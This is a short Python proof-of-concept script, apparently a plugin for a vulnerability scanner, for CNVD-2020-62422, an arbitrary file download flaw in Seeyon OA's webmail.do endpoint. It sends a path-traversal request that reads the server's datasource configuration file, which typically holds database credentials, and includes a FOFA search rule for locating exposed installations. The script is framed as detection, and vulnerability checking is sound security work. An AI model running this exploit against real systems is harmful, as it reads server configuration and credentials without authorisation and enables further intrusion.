#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests

from Config.config_proxies import proxies
from Config.config_requests import  headers

requests.packages.urllib3.disable_warnings()
# 脚本信息
######################################################
NAME='CNVD_2020_62422'
AUTHOR="Joker"
REMARK='致远OA webmail.do任意文件下载检测'
FOFA_RULE='title="致远'
######################################################

def poc(target):
    result = {}
    vuln_url = target + "/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
    try:

        r = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5,proxies=proxies)
        if 'workflow.dialect' in r.text and r.status_code==200:
            result['target'] = target
            result['poc'] = NAME
            return result
    except:
        pass

if __name__ == '__main__':
    poc('http://127.0.0.1')